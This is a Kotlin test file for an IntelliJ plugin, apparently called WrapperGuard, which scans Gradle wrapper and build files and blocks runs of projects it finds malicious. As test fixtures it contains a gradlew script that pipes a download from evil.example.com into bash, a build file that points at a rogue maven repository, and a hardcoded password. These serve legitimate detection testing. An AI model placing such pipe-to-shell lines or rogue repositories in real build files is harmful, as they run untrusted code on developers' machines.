package com.sal7one.wrapperguard.intellij.execution

import com.intellij.execution.Executor
import com.intellij.ide.trustedProjects.TrustedProjects
import com.intellij.execution.RunnerAndConfigurationSettings
import com.intellij.execution.configurations.ConfigurationFactory
import com.intellij.execution.configurations.ConfigurationTypeBase
import com.intellij.execution.configurations.RunConfiguration
import com.intellij.execution.configurations.RunConfigurationBase
import com.intellij.execution.configurations.RunConfigurationOptions
import com.intellij.execution.configurations.RunProfileState
import com.intellij.execution.executors.DefaultRunExecutor
import com.intellij.execution.impl.RunManagerImpl
import com.intellij.execution.runners.ExecutionEnvironment
import com.intellij.execution.runners.ExecutionEnvironmentBuilder
import com.intellij.execution.runners.ProgramRunner
import com.intellij.openapi.actionSystem.DataContext
import com.intellij.openapi.options.SettingsEditor
import com.intellij.openapi.project.Project
import com.intellij.testFramework.HeavyPlatformTestCase
import com.sal7one.wrapperguard.core.model.Finding
import com.sal7one.wrapperguard.core.model.PolicyAction
import com.sal7one.wrapperguard.intellij.WrapperGuardProjectService
import com.sal7one.wrapperguard.intellij.backfillBeforeRunTasks
import java.nio.file.Files
import java.nio.file.Path
import javax.swing.JComponent
import javax.swing.JPanel
import com.sal7one.wrapperguard.intellij.demo.WrapperGuardDemo

/**
 * End-to-end guard smoke tests (headless): a malicious fixture project must produce
 * BLOCK-policy findings, the before-run provider must refuse the launch and request the
 * execution-blocked dialog, a clean project must pass, new run configurations must get the
 * guard task automatically, and existing configurations must be back-filled on project open.
 */
class GuardSmokeTest : HeavyPlatformTestCase() {

    fun testDescriptorLoadsBundledComposeWithoutRequiringLaterAggregateAlias() {
        val descriptor = com.intellij.ide.plugins.PluginManagerCore.getPlugin(
            com.intellij.openapi.extensions.PluginId.getId("com.sal7one.wrapperguard.next"))
        assertNotNull("The plugin must load on the minimum platform, not silently lose services and guards", descriptor)
        assertTrue(descriptor!!.isEnabled)
        val loader = requireNotNull(descriptor.pluginClassLoader) { "The enabled plugin must have its own classloader" }
        listOf("androidx.compose.runtime.Composer", "org.jetbrains.jewel.foundation.theme.JewelTheme",
            "org.jetbrains.jewel.ui.component.TextKt", "org.jetbrains.jewel.bridge.JewelComposePanelWrapperKt").forEach {
            assertNotNull("Bundled Compose/Jewel must resolve through the installed plugin classloader: $it", loader.loadClass(it))
        }
        val xml = javaClass.getResourceAsStream("/META-INF/plugin.xml")!!.use {
            javax.xml.parsers.DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(it)
        }
        val dependencies = xml.getElementsByTagName("depends")
        val alias = (0 until dependencies.length).map { dependencies.item(it) as org.w3c.dom.Element }
            .single { it.textContent.trim() == "com.intellij.modules.compose" }
        assertEquals("The aggregate alias is absent in original 252 and must be optional", "true", alias.getAttribute("optional"))
        assertNotNull(javaClass.getResource("/META-INF/${alias.getAttribute("config-file")}"))
    }

    fun testDescriptorRegistersBeforeRunProviderWithIdeRegistry() {
        val provider = com.intellij.execution.BeforeRunTaskProvider.getProvider(project, WrapperGuardBeforeRunTaskProvider.KEY)
        assertNotNull("The IDE must resolve the attached task through its project extension registry", provider)
        assertTrue(provider is WrapperGuardBeforeRunTaskProvider)
        assertTrue("Static vetting remains available while indexes are rebuilding", provider is com.intellij.openapi.project.DumbAware)
    }

    fun testWorkerThreadDecisionRunsOnEdtAndPreservesCancellationChoice() {
        val future = java.util.concurrent.CompletableFuture.supplyAsync {
            assertFalse(com.intellij.openapi.application.ApplicationManager.getApplication().isDispatchThread)
            runDecisionOnEdt {
                assertTrue("Decision UI must be created and shown on the EDT", com.intellij.openapi.application.ApplicationManager.getApplication().isDispatchThread)
                false
            }
        }
        val deadline = System.nanoTime() + java.util.concurrent.TimeUnit.SECONDS.toNanos(10)
        while (!future.isDone && System.nanoTime() < deadline) {
            com.intellij.util.ui.UIUtil.dispatchAllInvocationEvents()
            Thread.sleep(10)
        }
        assertFalse("A Cancel choice must remain false after EDT dispatch", future.get(1, java.util.concurrent.TimeUnit.SECONDS))
        assertTrue(runDecisionOnEdt { true })
    }

    /** A real run configuration whose type id contains "gradle" so the guard applies. */
    private class FakeGradleRunConfiguration(project: Project, factory: ConfigurationFactory) :
        RunConfigurationBase<RunConfigurationOptions>(project, factory, "fake-gradle-run") {

        override fun getOptions(): RunConfigurationOptions = RunConfigurationOptions()

        override fun getState(executor: Executor, environment: ExecutionEnvironment): RunProfileState? =
            object : RunProfileState {
                override fun execute(executor: Executor, runner: ProgramRunner<*>): com.intellij.execution.ExecutionResult? = null
            }

        override fun getConfigurationEditor(): SettingsEditor<out RunConfiguration> =
            object : SettingsEditor<RunConfiguration>() {
                override fun resetEditorFrom(s: RunConfiguration) {}
                override fun applyEditorTo(s: RunConfiguration) {}
                override fun createEditor(): JComponent = JPanel()
            }
    }

    private val factory: ConfigurationFactory by lazy {
        val type = object : ConfigurationTypeBase("GradleTest", "GradleTest", "Test type", null as javax.swing.Icon?) {}
        object : ConfigurationFactory(type) {
            override fun getId(): String = "GradleTestFactory"
            override fun createTemplateConfiguration(project: Project): RunConfiguration =
                FakeGradleRunConfiguration(project, this)
        }
    }

    private fun registerConfiguration(name: String): RunnerAndConfigurationSettings {
        val runManager = RunManagerImpl.getInstanceImpl(project)
        val settings = runManager.createConfiguration(name, factory)
        settings.isTemporary = false
        runManager.addConfiguration(settings)
        return settings
    }

    private fun writeFixture(dir: Path, name: String, content: String) {
        val file = dir.resolve(name)
        Files.createDirectories(file.parent)
        Files.writeString(file, content)
    }

    fun testMaliciousFixtureBlocksRunAndRequestsDialog() {
        val root = Path.of(project.basePath!!)
        writeFixture(root, "gradlew", MALICIOUS_GRADLEW)
        writeFixture(root, "build.gradle", MALICIOUS_BUILD)

        val settings = registerConfiguration("smoke-run")
        val configuration = settings.configuration

        var dialogShown = false
        val provider = object : WrapperGuardBeforeRunTaskProvider() {
            override fun askUserToRunOnce(
                project: Project,
                configuration: RunConfiguration,
                blockers: List<Finding>
            ): Boolean {
                dialogShown = true
                return false
            }
        }

        // New configurations must receive the guard task automatically (createTask).
        val task = provider.createTask(configuration)
        assertNotNull("guard task must auto-attach to new Gradle run configurations", task)
        assertTrue(task!!.isEnabled)

        val env: ExecutionEnvironment = ExecutionEnvironmentBuilder
            .create(project, DefaultRunExecutor.getRunExecutorInstance(), configuration)
            .build()

        val allowed = provider.executeTask(DataContext.EMPTY_CONTEXT, configuration, env, task)
        assertFalse("malicious fixture must block the run", allowed)
        assertTrue("execution-blocked dialog must be requested", dialogShown)

        // The published report must contain the blocking pipe-to-shell finding…
        val report = project.getService(WrapperGuardProjectService::class.java).report
        assertNotNull("the blocking report must be published for the tool window", report)
        val blockers = report!!.findings.filter { it.policyAction == PolicyAction.BLOCK }
        assertTrue("at least one BLOCK-policy finding expected", blockers.isNotEmpty())

        // …and credential evidence must be redacted before it reaches UI/export/logs.
        val credential = report.findings.firstOrNull { it.ruleId == "WG-BUILD-010" }
        assertNotNull("hardcoded-credential finding expected", credential)
        val evidence = credential!!.evidence
        assertNotNull(evidence)
        assertTrue("evidence must be masked", evidence!!.text.contains("[redacted]"))
        assertFalse("raw secret must never reach the report", evidence.text.contains("hunter2"))
        assertTrue("evidence.redacted flag must be set", evidence.redacted)
    }

    fun testCleanFixtureAllowsRunWithoutDialog() {
        val root = Path.of(project.basePath!!)
        writeFixture(root, "gradlew", CLEAN_GRADLEW)
        writeFixture(root, "build.gradle", "// clean fixture\n")

        val settings = registerConfiguration("clean-run")
        val configuration = settings.configuration

        var dialogShown = false
        val provider = object : WrapperGuardBeforeRunTaskProvider() {
            override fun askUserToRunOnce(
                project: Project,
                configuration: RunConfiguration,
                blockers: List<Finding>
            ): Boolean {
                dialogShown = true
                return false
            }
        }

        val task = provider.createTask(configuration)!!
        val env = ExecutionEnvironmentBuilder
            .create(project, DefaultRunExecutor.getRunExecutorInstance(), configuration)
            .build()

        val allowed = provider.executeTask(DataContext.EMPTY_CONTEXT, configuration, env, task)
        assertTrue("clean fixture must be allowed to run", allowed)
        assertFalse("no dialog for a clean scan", dialogShown)
    }

    fun testBackfillAddsEnabledTaskToExistingConfigurations() {
        val settings = registerConfiguration("pre-existing-run")
        val configuration = settings.configuration

        val runManager = RunManagerImpl.getInstanceImpl(project)
        // Simulate a configuration saved before the plugin was installed. Registered providers now attach new tasks automatically.
        runManager.setBeforeRunTasks(configuration, runManager.getBeforeRunTasks(configuration).filterNot { it.providerId == WrapperGuardBeforeRunTaskProvider.KEY })
        assertTrue(
            "pre-existing configuration starts without the guard task",
            runManager.getBeforeRunTasks(configuration).none { it.providerId == WrapperGuardBeforeRunTaskProvider.KEY }
        )

        backfillBeforeRunTasks(project)

        val tasks = runManager.getBeforeRunTasks(configuration)
        assertTrue(
            "existing configurations must receive an enabled guard task on project open",
            tasks.any { it.providerId == WrapperGuardBeforeRunTaskProvider.KEY && it.isEnabled }
        )
    }

    fun testSafeModeRejectsRunWithoutOfferingRunOnce() {
        withProjectTrustChecks {
            TrustedProjects.setProjectTrusted(project, false)
            val configuration = registerConfiguration("untrusted-run").configuration
            var offeredOverride = false
            val provider = object : WrapperGuardBeforeRunTaskProvider() {
                override fun askUserToRunOnce(project: Project, configuration: RunConfiguration, blockers: List<Finding>): Boolean {
                    offeredOverride = true
                    return true
                }
            }
            val env = ExecutionEnvironmentBuilder.create(project, DefaultRunExecutor.getRunExecutorInstance(), configuration).build()
            assertFalse(provider.executeTask(DataContext.EMPTY_CONTEXT, configuration, env, provider.createTask(configuration)!!))
            assertFalse("project trust must use the IDE's trust controls", offeredOverride)
            assertTrue(project.getService(WrapperGuardProjectService::class.java).report!!.findings.any {
                it.ruleId == "WG-PROJECT-UNTRUSTED"
            })
        }
    }

    fun testDemoModeRefusesRunWithoutOfferingRunOnce() {
        val previous = System.getProperty(WrapperGuardDemo.ENABLED_PROPERTY)
        try {
            System.setProperty(WrapperGuardDemo.ENABLED_PROPERTY, "true")
            val configuration = registerConfiguration("demo-run").configuration
            var offeredOverride = false
            val provider = object : WrapperGuardBeforeRunTaskProvider() {
                override fun askUserToRunOnce(project: Project, configuration: RunConfiguration, blockers: List<Finding>): Boolean {
                    offeredOverride = true
                    return true
                }
            }
            val env = ExecutionEnvironmentBuilder.create(project, DefaultRunExecutor.getRunExecutorInstance(), configuration).build()
            assertFalse(provider.executeTask(DataContext.EMPTY_CONTEXT, configuration, env, provider.createTask(configuration)!!))
            assertFalse(offeredOverride)
        } finally {
            if (previous == null) System.clearProperty(WrapperGuardDemo.ENABLED_PROPERTY)
            else System.setProperty(WrapperGuardDemo.ENABLED_PROPERTY, previous)
        }
    }

    fun testTrustRevocationWhileRunOnceDialogIsOpenPreventsRun() {
        withProjectTrustChecks {
            TrustedProjects.setProjectTrusted(project, true)
            writeFixture(Path.of(project.basePath!!), "gradlew", MALICIOUS_GRADLEW)
            val configuration = registerConfiguration("trust-revoked-run").configuration
            var offeredOverride = false
            val provider = object : WrapperGuardBeforeRunTaskProvider() {
                override fun askUserToRunOnce(project: Project, configuration: RunConfiguration, blockers: List<Finding>): Boolean {
                    offeredOverride = true
                    TrustedProjects.setProjectTrusted(project, false)
                    return true
                }
            }
            val env = ExecutionEnvironmentBuilder.create(project, DefaultRunExecutor.getRunExecutorInstance(), configuration).build()
            assertFalse(provider.executeTask(DataContext.EMPTY_CONTEXT, configuration, env, provider.createTask(configuration)!!))
            assertTrue(offeredOverride)
        }
    }

    private fun withProjectTrustChecks(action: () -> Unit) {
        val keys = listOf("idea.trust.headless.disabled", "idea.trust.all.projects", "idea.trust.disabled")
        val previous = keys.associateWith { System.getProperty(it) }
        try {
            keys.forEach { System.setProperty(it, "false") }
            action()
        } finally {
            TrustedProjects.setProjectTrusted(project, true)
            previous.forEach { (key, value) -> if (value == null) System.clearProperty(key) else System.setProperty(key, value) }
        }
    }

    companion object {
        private val MALICIOUS_GRADLEW = """
            #!/bin/sh
            set -e
            curl -fsSL https://evil.example.com/install.sh | bash
            echo "done"
        """.trimIndent() + "\n"

        private val MALICIOUS_BUILD = """
            repositories {
                maven { url "https://evil.example.com/maven" }
            }
            password = "hunter2"
        """.trimIndent() + "\n"

        private val CLEAN_GRADLEW = """
            #!/bin/sh
            echo "clean fixture"
        """.trimIndent() + "\n"
    }
}
